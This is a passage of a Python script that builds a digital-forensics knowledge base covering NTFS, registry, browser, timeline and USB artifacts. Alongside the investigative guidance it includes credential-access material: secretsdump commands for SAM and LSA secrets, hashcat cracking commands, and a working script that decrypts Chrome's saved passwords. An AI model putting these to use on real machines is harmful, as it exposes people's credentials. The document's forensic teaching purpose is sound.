"""Append Collections 4 (Disk Forensics) to kb_forensics_advanced.py."""

chunk = r'''

DISK_FORENSICS = [
    {
        "title": "NTFS Forensics — MFT, $LogFile, $UsnJrnl, Alternate Data Streams",
        "tags": ["ntfs", "mft", "usnjrnl", "ads", "disk-forensics", "dfir"],
        "content": """# NTFS Forensics

## NTFS Key Metadata Files

| File | Location | Contents |
|---|---|---|
| $MFT | Cluster 0 | Master File Table — one 1KB record per file/directory |
| $LogFile | $Volume | Transaction log (NTFS journal for crash recovery) |
| $UsnJrnl:$J | \\$Extend\\$UsnJrnl | Change journal — file create/delete/rename events |
| $Boot | Sector 0 | Boot sector + NTFS BPB |
| $Bitmap | Root | Cluster allocation bitmap |
| $BadClus | Root | Bad cluster map |

## Master File Table ($MFT)

Every NTFS file/directory has at least one 1024-byte MFT record.

### Key MFT Attributes

| Attribute | Type ID | Contents |
|---|---|---|
| $STANDARD_INFORMATION | 0x10 | Created, Modified, MFT Modified, Accessed timestamps |
| $FILE_NAME | 0x30 | Filename + second set of timestamps |
| $DATA | 0x80 | File content (resident if < ~700 bytes, else cluster runs) |
| $INDEX_ROOT | 0x90 | Directory B-tree root |
| $ATTRIBUTE_LIST | 0x20 | Pointer to extension records |

### Timestamp Forensics (MACB)

NTFS maintains two sets of timestamps:
- **$STANDARD_INFORMATION** (user-visible): Modified, Accessed, Created, MFT Changed
- **$FILE_NAME**: Same four, but harder to modify (requires kernel access)

```
Timestomping indicator: $SI timestamps are identical (attacker reset all to same value)
OR: $SI timestamps are earlier than $FN timestamps
$FN timestamps not easily spoofed — good ground truth
```

### MFT Analysis Tools

```bash
# MFTECmd (Eric Zimmerman) — parse MFT to CSV:
MFTECmd.exe -f "C:\$MFT" --csv output\ --csvf mft_parsed.csv
MFTECmd.exe -f "E:\image\$MFT" --csv output\ --csvf mft_parsed.csv

# mft2csv (Python):
pip install mft
python mft2csv.py -f $MFT -o mft_output.csv

# Volatility:
vol.py -f memory.raw windows.mftscan   # MFT records from memory

# Timeline Explorer (EZ Tools) — GUI for MFT CSV analysis
```

```python
# Python: parse MFT with the mft library
from mft import PyMFT
mft = PyMFT("$MFT")
for record in mft:
    if record.is_active:
        si = record.standard_information
        fn = record.file_name
        print(f"{fn.filename} | Created: {si.created} | Modified: {si.modified}")
```

## $UsnJrnl Change Journal

The USN Journal records all file system changes (create, delete, rename, write, security change).

```bash
# Extract $UsnJrnl:$J from live system:
fsutil usn readjournal C: csv > usnjrnl.csv

# Extract from disk image with MFTECmd:
MFTECmd.exe -f "E:\image\$J" --csv output\ --csvf usnjrnl.csv

# Key fields:
# TimeStamp, MFTEntryNumber, ParentMFTEntryNumber, Filename, Reason

# Useful queries:
# Find deleted files:
grep "FILE_DELETE" usnjrnl.csv

# Find renamed files:
grep "RENAME" usnjrnl.csv | grep -i ".exe"

# Find files created in suspicious dirs:
grep "FILE_CREATE" usnjrnl.csv | grep -iE "temp|appdata|programdata"
```

## $LogFile

The $LogFile records NTFS metadata operations for crash recovery.

```bash
# Parse $LogFile for deleted file metadata:
# LogFileParser (by Jochen Metzger)
LogFileParser.exe -f $LogFile -o logfile_output.csv

# Key use case: recover deleted file metadata even after deletion
# Log entries show pre- and post-operation state
```

## Alternate Data Streams (ADS)

ADS allows data to be hidden in named streams of a file.

```powershell
# List ADS on system:
Get-Item * -Stream * | Where-Object {$_.Stream -ne ':$Data'}

# List ADS of specific file:
Get-Item malware.exe -Stream *

# Create ADS (attacker technique):
# echo "hidden data" > legitimate.txt:hidden_stream

# Read ADS content:
Get-Content legitimate.txt:hidden_stream
more < legitimate.txt:hidden_stream

# Delete ADS:
Remove-Item legitimate.txt -Stream hidden_stream
```

```bash
# Linux tools for NTFS ADS:
ntfs-3g mount with streams support
getfattr -n ntfs.streams.list /mnt/ntfs/file.txt
getfattr -n user.stream_name /mnt/ntfs/file.txt

# MFTECmd parses and lists all ADS in MFT output
# Zone.Identifier is a common legitimate ADS (marks downloaded files)
# Suspicious: executable content hidden in text file ADS
```

## Zone.Identifier — Download Tracking

```bash
# Windows adds Zone.Identifier ADS to downloaded files:
Get-Content downloaded_malware.exe:Zone.Identifier
# [ZoneTransfer]
# ZoneId=3          # Zone 3 = Internet
# ReferrerUrl=https://...
# HostUrl=https://...
# Attackers delete this to hide download origin
# Missing Zone.Identifier on executable = possible anti-forensics
```
""",
    },
    {
        "title": "Windows Artifact Analysis — Prefetch, Amcache, ShimCache, SRUM",
        "tags": ["prefetch", "amcache", "shimcache", "srum", "windows-artifacts", "disk-forensics"],
        "content": """# Windows Execution Artifacts

## Prefetch

Windows Prefetch tracks program execution to speed up subsequent launches. Stores last 8 run times (Vista+) and file dependencies.

```
Location: C:\Windows\Prefetch\
Format:   <PROGRAM_NAME>-<HASH>.pf
Hash:     CRC32 of the full executable path
Stores:   Last 8 run times, file references, volume serial numbers
```

### Parsing

```bash
# PECmd.exe (Eric Zimmerman):
PECmd.exe -f "C:\Windows\Prefetch\MALWARE.EXE-AABBCCDD.pf"
PECmd.exe -d "C:\Windows\Prefetch\" --csv output\ --csvf prefetch.csv

# Output includes:
# - Source Created/Modified timestamps
# - Last run time (most recent of 8)
# - All 8 run times
# - Run count
# - Files loaded (DLLs, config files, data files)
# - Volumes accessed

# Key investigative uses:
# Prove execution of malware.exe even after file deletion
# Determine first/last execution time
# See what files the malware accessed
```

### Prefetch on Windows Server

Prefetch is disabled by default on Windows Server. It can be enabled:
```
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters
EnablePrefetcher: 3 (enable application + boot prefetch)
```

## Amcache

Amcache records SHA1 hashes and metadata of executed programs and installed drivers.

```
Location: C:\Windows\appcompat\Programs\Amcache.hve (Windows 8+)
Previous: C:\Windows\AppCompat\Programs\RecentFileCache.bcf (Win7)
```

```bash
# AmcacheParser.exe (Eric Zimmerman):
AmcacheParser.exe -f "C:\Windows\appcompat\Programs\Amcache.hve" --csv output\

# Output files:
# Amcache_AssociatedFileEntries.csv  — executable SHA1 hashes, paths, compile time
# Amcache_UnassociatedFileEntries.csv
# Amcache_DeviceContainers.csv       — USB/device history

# Key fields: SHA1, FullPath, FileDescription, ProductName, Publisher, LinkDate
# Use SHA1 to look up on VirusTotal (partial hash coverage)
```

## ShimCache (AppCompatCache)

ShimCache records program execution metadata for application compatibility purposes.

```
Location: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
          AppCompatCache value (binary data)
Also: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache\AppCompatCache
```

```bash
# AppCompatCacheParser.exe (Eric Zimmerman):
AppCompatCacheParser.exe -f SYSTEM --csv output\ --csvf shimcache.csv

# Fields: LastModifiedTimeUTC, Path, Executed (flag not always reliable)
# Note: records program's presence on disk even if NOT executed
# Combined with Prefetch: presence (Shim) + execution (Prefetch)

# Timestomping detection: compare ShimCache timestamp vs. Prefetch timestamps
# If Shim shows file modified after Prefetch last run = suspicious
```

## SRUM (System Resource Usage Monitor)

SRUM records 30-60 days of application resource usage, network usage, and push notification data.

```
Location: C:\Windows\System32\srum\SRUDB.dat (ESE database)
```

```bash
# srum-dump (Mark Baggett):
python srum-dump.py SRUDB.dat -r SOFTWARE -o srum_report.xlsx

# Eric Zimmerman SrumECmd:
SrumECmd.exe -f "C:\Windows\System32\srum\SRUDB.dat" --csv output\

# Tables:
# {D10CA2FE-6FCF-4F6D-848E-B2E99266FA89} — Application Resource Usage
#   AppId, UserSid, ForegroundCycleTime, BackgroundCycleTime, NetworkBytesRaw
# {973F5D5C-1D90-4944-BE8E-24B94231A174} — Network Data Usage
#   AppId, UserSid, BytesSent, BytesRecvd, InterfaceLuid
# {7ACBBAA3-D029-4BE4-9A7A-0885927F1D8F} — Network Connections
#   AppId, UserSid, ConnectStartTime, ConnectedTime

# Investigate malware: search by executable name in AppId column
# Find: exact bytes sent/received to C2, duration of C2 session
# Even if malware deleted: SRUM retains 30-60 day history
```

## Jump Lists

```
Location: %APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\
          %APPDATA%\Microsoft\Windows\Recent\CustomDestinations\

# JLECmd.exe (Eric Zimmerman):
JLECmd.exe -d "%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\" --csv output\

# Contains: recently opened files, application IDs, timestamps
# Forensic value: prove interaction with specific files
```

## LNK Files

```bash
# LNK files created when user double-clicks a file
# Location: %APPDATA%\Microsoft\Windows\Recent\
# Also: Desktop, Start Menu, taskbar pinned items

# LECmd.exe (Eric Zimmerman):
LECmd.exe -f "C:\Users\user\AppData\Roaming\Microsoft\Windows\Recent\malware.exe.lnk"
LECmd.exe -d "C:\Users\user\AppData\Roaming\Microsoft\Windows\Recent\" --csv output\

# Contains: target path, timestamps of target at time of linking,
#           machine hostname and volume serial of target (even network shares)
# Useful: prove file existed at specific path on specific date
```
""",
    },
    {
        "title": "Windows Registry Forensics — SAM, SYSTEM, SOFTWARE, NTUSER.DAT",
        "tags": ["registry", "sam", "ntuser-dat", "windows-forensics", "disk-forensics"],
        "content": """# Windows Registry Forensics

## Registry Hive Files

| Hive | Path | Contents |
|---|---|---|
| SYSTEM | C:\Windows\System32\config\SYSTEM | Services, hardware, network config |
| SOFTWARE | C:\Windows\System32\config\SOFTWARE | Installed apps, system settings |
| SAM | C:\Windows\System32\config\SAM | Local accounts and hashed passwords |
| SECURITY | C:\Windows\System32\config\SECURITY | LSA secrets, cached domain credentials |
| NTUSER.DAT | C:\Users\<user>\ | Per-user settings, MRUs, typed URLs |
| UsrClass.dat | C:\Users\<user>\AppData\Local\Microsoft\Windows\ | Shell extension settings |
| AMCACHE.hve | C:\Windows\AppCompat\Programs\ | Execution history |

## Tools

```bash
# RegRipper — automated extraction of forensic artifacts:
rip.pl -r NTUSER.DAT -f ntuser     # Run all NTUSER.DAT plugins
rip.pl -r SOFTWARE -f software     # Run all SOFTWARE plugins
rip.pl -r SYSTEM -f system         # Run all SYSTEM plugins
rip.pl -r SAM -f sam               # Extract account info

# Registry Explorer (Eric Zimmerman) — GUI hive browser
# RECmd.exe — command-line hive parser
RECmd.exe -f NTUSER.DAT --kn "Software\Microsoft\Windows\CurrentVersion\Run" --csv output\
```

## SAM — Local Accounts

```bash
# SAM contains NT hashes for local accounts (encrypted with SYSKEY)
# Requires SYSTEM hive for SYSKEY

# impacket secretsdump.py (offline):
python secretsdump.py -sam SAM -system SYSTEM LOCAL
# Output: admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Interpret: username:RID:LM_hash:NT_hash
# NT hash 31d6cfe0... = empty password

# Crack NT hash:
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
john --format=NT hashes.txt --wordlist=rockyou.txt
```

## SYSTEM Hive Forensics

```bash
# Current control set:
RECmd.exe -f SYSTEM --kn "Select" --csv output\
# Current value indicates active control set (001 or 002)

# Installed services (persistence/malware):
RECmd.exe -f SYSTEM --kn "ControlSet001\Services" --csv output\
# Look for: services with suspicious ImagePath (not in System32\drivers)
# Type = 16 (own process) or 32 (shared process) + Start = 2 (auto)

# USB device history (via USBSTOR):
RECmd.exe -f SYSTEM --kn "ControlSet001\Enum\USBSTOR" --csv output\
# Shows all USB storage devices ever connected

# Network interface info:
RECmd.exe -f SYSTEM --kn "ControlSet001\Services\Tcpip\Parameters\Interfaces" --csv output\
```

## SOFTWARE Hive Forensics

```bash
# Installed programs:
RECmd.exe -f SOFTWARE --kn "Microsoft\Windows\CurrentVersion\Uninstall" --csv output\

# Run keys (system-wide):
RECmd.exe -f SOFTWARE --kn "Microsoft\Windows\CurrentVersion\Run" --csv output\
RECmd.exe -f SOFTWARE --kn "Microsoft\Windows\CurrentVersion\RunOnce" --csv output\

# Windows Defender exclusions (attackers add these):
RECmd.exe -f SOFTWARE --kn "Microsoft\Windows Defender\Exclusions\Paths" --csv output\

# .NET installed versions:
RECmd.exe -f SOFTWARE --kn "Microsoft\NET Framework Setup\NDP" --csv output\

# AppInit_DLLs (DLL loaded into every user-mode process):
RECmd.exe -f SOFTWARE --kn "Microsoft\Windows NT\CurrentVersion\Windows" --csv output\
# AppInit_DLLs value: any non-empty value = DLL injection into all processes
```

## NTUSER.DAT — User Activity

```bash
# RecentDocs (files recently opened):
rip.pl -r NTUSER.DAT -p recentdocs

# TypedURLs (URLs typed in IE/Edge):
rip.pl -r NTUSER.DAT -p typedurls

# UserAssist (programs launched via Explorer, ROT13-encoded):
rip.pl -r NTUSER.DAT -p userassist
# Or: RECmd.exe with UserAssist key

# Run keys (user-specific persistence):
RECmd.exe -f NTUSER.DAT --kn "Software\Microsoft\Windows\CurrentVersion\Run" --csv output\

# ShellBags (folders accessed via Explorer — including deleted/network folders):
rip.pl -r NTUSER.DAT -p shellbags
# ShellBagsExplorer.exe (GUI) for easier analysis

# MuiCache (executed program display names):
RECmd.exe -f NTUSER.DAT --kn "Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" --csv output\
# Proves execution: even if binary deleted, display name remains
```

## SECURITY Hive — LSA Secrets and Cached Credentials

```bash
# Requires SYSTEM hive for decryption
python secretsdump.py -security SECURITY -system SYSTEM LOCAL

# Output includes:
# DPAPI_SYSTEM — DPAPI master key protector
# $MACHINE.ACC — machine account password hash
# NL$KM — cached domain credential encryption key
# L$RTMTIMEBOMB_... — terminal server info
# _SC_<service> — service account passwords
# DefaultPassword — autologon password if configured
```
""",
    },
    {
        "title": "File Carving — Recovering Deleted Files, Magic Bytes, PhotoRec/Scalpel",
        "tags": ["file-carving", "deleted-files", "photoRec", "scalpel", "disk-forensics"],
        "content": """# File Carving — Recovering Deleted Files

## How File Deletion Works

When a file is deleted on NTFS:
1. MFT record marked as not in use (but data remains until overwritten)
2. `$Bitmap` marks clusters as free
3. `$UsnJrnl` records `FILE_DELETE` event
4. Actual data persists in unallocated clusters

File carving recovers files by identifying known headers (magic bytes) in raw disk data.

## Magic Bytes Reference

| File Type | Hex Signature (Header) | Hex Footer |
|---|---|---|
| JPEG | FF D8 FF E0 / FF D8 FF E1 | FF D9 |
| PNG | 89 50 4E 47 0D 0A 1A 0A | 49 45 4E 44 AE 42 60 82 |
| PDF | 25 50 44 46 (%PDF) | 25 25 45 4F 46 (%%EOF) |
| ZIP | 50 4B 03 04 | 50 4B 05 06 |
| PE/EXE | 4D 5A (MZ) | — |
| ELF | 7F 45 4C 46 | — |
| DOCX/XLSX | 50 4B 03 04 (ZIP-based) | — |
| DOC/XLS | D0 CF 11 E0 | — |
| 7-Zip | 37 7A BC AF 27 1C | — |
| RAR | 52 61 72 21 1A 07 | — |
| PCAP | D4 C3 B2 A1 (LE) / A1 B2 C3 D4 (BE) | — |
| SQLite | 53 51 4C 69 74 65 20 33 | — |

## PhotoRec

PhotoRec is a free, open-source file carver supporting 480+ file types.

```bash
# Interactive mode:
photorec /dev/sdb

# Command-line mode:
photorec /log /d output/ /cmd image.dd fileopt,everything,enable,exec

# Key options in interactive mode:
# 1. Select source (disk image or device)
# 2. Select partition type (Intel or EFI)
# 3. Select filesystem type (unknown = carve from raw)
# 4. Select output directory (never to the source disk!)

# Output: numbered directories containing recovered files
# File names are not recovered (only content and type)
```

## Scalpel

Scalpel is a fast, configurable file carver using header/footer definitions.

```bash
# Install:
apt install scalpel

# Configuration file: /etc/scalpel/scalpel.conf
# Uncomment types to carve, e.g.:
# jpg y 200000000 \xff\xd8\xff\xe0 \xff\xd9
# pdf y 10000000 %PDF
# zip y 10000000 PK\x03\x04 PK\x05\x06

# Run:
scalpel -c scalpel.conf -o output/ disk_image.dd

# Output:
# output/jpg-0-0/ : all recovered JPEG files
# output/pdf-0-0/ : all recovered PDF files
# output/audit.txt : detailed log
```

## Autopsy / Sleuth Kit File Carving

```bash
# The Sleuth Kit command-line:
# List all files including deleted:
fls -r -d image.dd    # -r recursive, -d deleted only

# Recover specific file by inode:
icat image.dd <inode_number> > recovered_file.exe

# Recover all deleted files:
fls -r -d image.dd | awk '{print $2}' | while read inode; do
  icat image.dd $inode > recovered/$inode.bin 2>/dev/null
done

# Autopsy GUI: Tools > File Analysis > show deleted files
```

## Custom Python Carver

```python
# Simple carver for PE executables in a disk image:
import struct

HEADER = b'\x4d\x5a'  # MZ magic

def carve_pe(image_path, output_dir):
    import os
    os.makedirs(output_dir, exist_ok=True)

    with open(image_path, 'rb') as f:
        data = f.read()

    offset = 0
    count = 0
    while True:
        offset = data.find(HEADER, offset)
        if offset == -1: break

        # Validate PE header
        try:
            e_lfanew = struct.unpack_from('<I', data, offset + 0x3C)[0]
            if e_lfanew < 0x40 or e_lfanew > 0x1000:
                offset += 2; continue
            pe_sig = data[offset + e_lfanew : offset + e_lfanew + 4]
            if pe_sig != b'PE\x00\x00':
                offset += 2; continue
        except:
            offset += 2; continue

        # Extract PE (estimate size or use SizeOfImage)
        try:
            size_offset = offset + e_lfanew + 4 + 20 + 56  # SizeOfImage field
            size = struct.unpack_from('<I', data, size_offset)[0]
            size = min(size, 50*1024*1024)  # Cap at 50MB
        except:
            size = 4096

        pe_data = data[offset:offset+size]
        out_path = f"{output_dir}/pe_{count:05d}_{offset:016x}.exe"
        with open(out_path, 'wb') as f:
            f.write(pe_data)
        print(f"Carved PE: {out_path} ({len(pe_data)} bytes)")
        count += 1
        offset += 2

    print(f"Total carved: {count} PE files")

carve_pe("disk_image.dd", "carved_pes/")
```

## Best Practices

```
1. NEVER carve to the same disk/image (overwrite risk)
2. Hash the image before and after to confirm integrity
3. For NTFS: first check MFT for deleted file records (faster, gives metadata)
4. File carving is last resort: no filenames, no timestamps, no directory structure
5. Filter carved files by size and hash against VirusTotal
6. For JPEG/PNG: open in hex viewer first (may contain malware embedded in images)
```
""",
    },
    {
        "title": "Timeline Analysis — Super Timelines with Plaso/log2timeline",
        "tags": ["timeline", "plaso", "log2timeline", "super-timeline", "disk-forensics", "dfir"],
        "content": """# Timeline Analysis with Plaso/log2timeline

## Concept

A super timeline aggregates timestamps from all artifact sources (filesystem, registry, event logs, browser history, prefetch, etc.) into a single chronological view. This reveals the complete attacker activity sequence.

## Installation

```bash
pip install plaso
# Or Docker (recommended for complex environments):
docker pull log2timeline/plaso
docker run -v /evidence:/evidence log2timeline/plaso log2timeline ...

# Verify installation:
log2timeline.py --version
psort.py --version
pinfo.py --version
```

## Creating a Plaso Storage File

```bash
# Process a disk image (Windows):
log2timeline.py --storage-file evidence.plaso --parsers win7 disk_image.dd

# Process a mounted filesystem directory:
log2timeline.py --storage-file evidence.plaso --parsers win7 /mnt/evidence/

# Process specific artifact types (faster, targeted):
log2timeline.py --storage-file evidence.plaso \
    --parsers "prefetch,mft,usnjrnl,winevtx,winreg,chrome_history,firefox_history" \
    /mnt/evidence/

# Process memory image:
log2timeline.py --storage-file mem_timeline.plaso \
    --parsers "volatility" memory.raw

# Parser groups:
# win7 — comprehensive Windows 7 parsers
# win7_slow — includes slow/expensive parsers
# linux — Linux/Unix parsers
# macos — macOS parsers

# Show available parsers:
log2timeline.py --parsers list
```

## Filtering with psort

```bash
# Full timeline to CSV:
psort.py -w timeline.csv -o l2tcsv evidence.plaso

# Filter by time range:
psort.py -w filtered.csv -o l2tcsv evidence.plaso \
    "date > '2025-03-15 14:00:00' AND date < '2025-03-15 16:00:00'"

# Filter by data type:
psort.py -w prefs.csv -o l2tcsv evidence.plaso "data_type contains 'prefetch'"
psort.py -w reg.csv -o l2tcsv evidence.plaso "data_type contains 'registry'"

# Search for IOCs:
psort.py -w ioc.csv -o l2tcsv evidence.plaso \
    "message contains 'malware.exe' OR message contains '185.220.101'"

# Output formats:
# l2tcsv — standard timeline format (best for Excel/Timeline Explorer)
# json_line — one JSON object per line
# timesketch — for Timesketch investigation platform
```

## Timesketch Integration

```bash
# Upload to Timesketch for collaborative investigation:
psort.py -o timesketch --server http://timesketch:5000 \
    --username admin --password admin --sketch_id 1 evidence.plaso

# Or use timesketch-import-client:
pip install timesketch-import-client
timesketch_importer --host http://timesketch:5000 \
    --username admin --password pass \
    --sketch_id 1 timeline.csv
```

## Timeline Explorer Analysis

Eric Zimmerman's Timeline Explorer provides an Excel-like GUI for filtering and analyzing super timelines.

```
1. Open timeline CSV in Timeline Explorer
2. Set filters on columns:
   - Date/Time: set IR window (e.g., ±2 hours around incident)
   - Source: filter to registry changes
   - Description: search for "malware.exe"
3. Color-code by source for visual pattern recognition
4. Export filtered view for report
```

## Manual Timeline Analysis

```bash
# grep-based search for attack timeline reconstruction:
grep -i "malware.exe\|svchost32\|evil.com" timeline.csv | sort -t, -k1 > attack_events.csv

# Find all registry changes in time window:
awk -F, '$1 >= "2025-03-15 14:00" && $1 <= "2025-03-15 16:00" && /registry/' timeline.csv

# Execution evidence across sources:
grep -E "prefetch|userassist|muicache|amcache" timeline.csv | \
  grep -i "malware.exe" | sort -t, -k1
```

## Key Timestamp Sources in Super Timeline

| Source | Plaso Parser | Forensic Value |
|---|---|---|
| $MFT | mft | File creation/modification/access |
| $UsnJrnl | usnjrnl | File operations (create/delete/rename) |
| Event logs (.evtx) | winevtx | Logon, process creation, service install |
| Registry | winreg | Configuration changes, persistence |
| Prefetch | prefetch | Program execution times |
| Browser history | chrome_history, firefox | Web activity |
| Email (.pst) | outlook_pst | Email timestamps |
| LNK files | lnk | File access via Explorer |
| Shellbags | shellbags | Folder navigation |
| SRUM | srum | Long-term execution/network history |
""",
    },
    {
        "title": "Browser Forensics — Chrome, Firefox, Edge History/Cache/Downloads",
        "tags": ["browser-forensics", "chrome", "firefox", "edge", "disk-forensics", "dfir"],
        "content": """# Browser Forensics

## Chrome/Chromium Artifact Locations

```
Profile directory: C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\

History           — SQLite: browsing history, downloads
Web Data          — SQLite: forms, autofill, credit cards (encrypted)
Login Data        — SQLite: saved passwords (encrypted with DPAPI)
Cookies           — SQLite: session cookies (encrypted)
Cache\            — Cached web content (binary format)
Network\Cookies   — Alternate cookie location (newer Chrome)
Bookmarks         — JSON: bookmarks
Extensions\       — Installed extensions
Local Storage\    — Per-site localStorage data
IndexedDB\        — Per-site IndexedDB
```

### Parsing Chrome Artifacts

```bash
# HistView / Hindsight / BrowsingHistoryView (GUI tools)

# Manual SQL queries:
sqlite3 "History" "SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch'), url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 50;"

sqlite3 "History" "SELECT datetime(start_time/1000000-11644473600,'unixepoch'), target_path, total_bytes, danger_type FROM downloads ORDER BY start_time DESC LIMIT 20;"

# Chrome timestamps: microseconds since 1601-01-01
# Convert: (chrome_timestamp / 1000000) - 11644473600 = Unix timestamp

# Hindsight — comprehensive Chrome/Edge artifact parser:
pip install hindsight
hindsight.py -i "C:\Users\user\AppData\Local\Google\Chrome\User Data" -o chrome_report

# Output: Excel file with all artifact types in separate tabs
```

### Chrome Password Decryption

```python
# Chrome encrypts passwords with DPAPI (AES-256-GCM on modern Chrome)
# Requires: running as the user OR having the DPAPI master key

import sqlite3, subprocess, base64, json, os
from pathlib import Path

# Get encryption key (stored in Local State):
local_state = Path.home() / "AppData/Local/Google/Chrome/User Data/Local State"
state = json.loads(local_state.read_text())
encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]  # Remove DPAPI prefix

# Decrypt key with DPAPI:
import win32crypt
key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Decrypt each password:
from Crypto.Cipher import AES
db = sqlite3.connect("Login Data")
cursor = db.execute("SELECT origin_url, username_value, password_value FROM logins")
for url, user, pw_enc in cursor:
    iv = pw_enc[3:15]      # Bytes 3-14 = nonce (12 bytes)
    payload = pw_enc[15:]  # Remaining = ciphertext + 16-byte tag
    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
    password = cipher.decrypt(payload[:-16]).decode()
    print(f"{url} | {user} | {password}")
```

## Firefox Artifact Locations

```
Profile: C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\<random>.default\

places.sqlite     — History, bookmarks, downloads
cookies.sqlite    — Cookies
formhistory.sqlite — Form autofill
logins.json       — Saved passwords (encrypted)
key4.db           — Password encryption key (NSS)
cert9.db          — Certificates
extensions\       — Installed add-ons
cache2\           — Cached content
sessionstore.jsonlz4 — Session restore data (open tabs)
```

```bash
# Parse Firefox places.sqlite:
sqlite3 places.sqlite "SELECT datetime(last_visit_date/1000000,'unixepoch'), url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 50;"

# Firefox timestamps: microseconds since Unix epoch (different from Chrome!)

# Downloads:
sqlite3 places.sqlite "SELECT datetime(lastModified/1000000,'unixepoch'), content, fileSize FROM moz_annos WHERE anno_attribute_id IN (SELECT id FROM moz_anno_attributes WHERE name='downloads/destinationFileName');"

# Firefox Password Decryption (requires NSS library):
# firepwd.py (published tool):
python firepwd.py -d "C:\Users\user\AppData\Roaming\Mozilla\Firefox\Profiles\xxx.default"
```

## Microsoft Edge

```
Location: C:\Users\<user>\AppData\Local\Microsoft\Edge\User Data\Default\
# Same SQLite format as Chrome (Edge is Chromium-based)
# Use same queries as Chrome
```

## Cache Analysis

```bash
# Chrome cache (binary format):
# ChromeCacheView (NirSoft) — GUI tool

# Extract cache entries with Python:
# cfv — Chrome File View tool

# Manual extraction:
# Cache files: \Cache\Cache_Data\f_XXXXXX
# Index file: \Cache\Cache_Data\index
# Parse with: cacheparser or ccl_chrome_indexeddb

# Look for: cached malware downloads, C2 responses, exfiltrated data
```

## Incognito / Private Browsing

Incognito mode does NOT write to disk history files. However:
```
- DNS cache still populated (ipconfig /displaydns)
- Memory contains browsing data (memory forensics)
- Network proxy/firewall logs capture traffic
- If system was imaged while browser was open: sessionstore contains session
```
""",
    },
    {
        "title": "USB Device Forensics — Windows USB Artifacts, SetupAPI, Registry",
        "tags": ["usb-forensics", "setupapi", "registry", "disk-forensics", "dfir"],
        "content": """# USB Device Forensics

## USB Artifact Sources

| Source | Location | Information |
|---|---|---|
| USBSTOR Registry | SYSTEM\Enum\USBSTOR | Device GUIDs, serial numbers, first connect |
| USB Registry | SYSTEM\Enum\USB | VID/PID, class, hardware IDs |
| MountedDevices | SYSTEM\MountedDevices | Drive letter assignments |
| MountPoints2 | NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2 | User-specific mount history |
| SetupAPI Log | C:\Windows\inf\setupapi.dev.log | First/last device install timestamps |
| Windows Event Logs | System.evtx | Event IDs 20001, 20003 (driver install) |
| Shell Notifications | NTUSER.DAT\Software\Microsoft\Windows\Shell\AttachmentExecute | Autorun history |

## Registry Analysis

```bash
# USBSTOR — storage devices ever connected:
RECmd.exe -f SYSTEM --kn "ControlSet001\Enum\USBSTOR" --csv output\
# Subkeys: VendorModel
# Sub-subkeys: Device serial number (or instance ID if no serial)
# Values: FriendlyName, DeviceDesc, ClassGUID, ParentIdPrefix

# USB — all USB devices (including non-storage):
RECmd.exe -f SYSTEM --kn "ControlSet001\Enum\USB" --csv output\
# VID_XXXX&PID_YYYY — vendor ID and product ID
# Lookup at https://devicehunt.com/

# MountedDevices — drive letter to device mapping:
RECmd.exe -f SYSTEM --kn "MountedDevices" --csv output\
# Binary data decoded: \DosDevices\E: = device GUID + serial

# User mount history (per user, per device):
RECmd.exe -f NTUSER.DAT --kn "Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2" --csv output\
# Subkey name = GUID of mounted device
# Shows which users mounted which devices
```

## SetupAPI Log Analysis

```bash
# C:\Windows\inf\setupapi.dev.log
# Contains: first install date/time for every device class

# Search for USB storage entries:
grep -A5 "USBSTOR" "C:\Windows\inf\setupapi.dev.log"

# Parse timestamps (local time):
# Format: >>>  [SetupCopyOEMInf] 2025-03-15 14:23:01.123
# First occurrence = first time device connected
# Log not cleared on reboot — persists since OS install
```

## Full USB Investigation Script

```python
# Extract USB history from offline SYSTEM and NTUSER.DAT hives
import subprocess, csv, json

def parse_usbstor(system_hive_path):
    """Extract USBSTOR device history."""
    result = subprocess.run([
        "RECmd.exe",
        "-f", system_hive_path,
        "--kn", "ControlSet001\\Enum\\USBSTOR",
        "--csv", "output\\",
        "--csvf", "usbstor.csv"
    ], capture_output=True)
    return "output\\usbstor.csv"

def analyze_usb_csv(csv_path):
    devices = {}
    with open(csv_path) as f:
        for row in csv.DictReader(f):
            key = row.get("KeyPath","")
            if "USBSTOR" in key:
                parts = key.split("\\")
                if len(parts) >= 7:
                    vendor_model = parts[5]
                    serial = parts[6]
                    devices[serial] = {
                        "model": vendor_model,
                        "first_seen": row.get("LastWriteTimestamp"),
                        "friendly_name": row.get("ValueData","") if row.get("ValueName") == "FriendlyName" else ""
                    }
    return devices
```

## Determining First/Last Connection Time

```
First connection:
1. SetupAPI.dev.log — absolute first time (persists, not cleared)
2. USBSTOR registry key LastWriteTime — may represent last device presence
3. MFT creation time of device registry key file (ntuser.dat.LOG entries)

Last connection:
1. USBSTOR registry LastWriteTime (updated on connect/disconnect on some versions)
2. Windows Event Log: EventID 2003 (Device removed)
3. NTUSER MountPoints2 key LastWriteTime

Drive letter assignment:
1. MountedDevices registry value
2. NTUSER MountPoints2 subkey

Files accessed from USB:
1. LNK files in Recent Items
2. Jump Lists pointing to USB drive path (e.g., E:\)
3. ShellBags for folder navigation on USB
```

## Practical Investigation Example

```bash
# Scenario: Investigate data exfiltration via USB

# Step 1: Identify USB devices connected in the timeframe
RECmd.exe -f SYSTEM --kn "ControlSet001\Enum\USBSTOR" --csv output\ --csvf usbstor.csv

# Step 2: Get device serial number and cross-reference to drive letter
RECmd.exe -f SYSTEM --kn "MountedDevices" --csv output\ --csvf mounted.csv

# Step 3: Find files accessed from that drive letter (e.g., E:\)
# LNK files pointing to E:\:
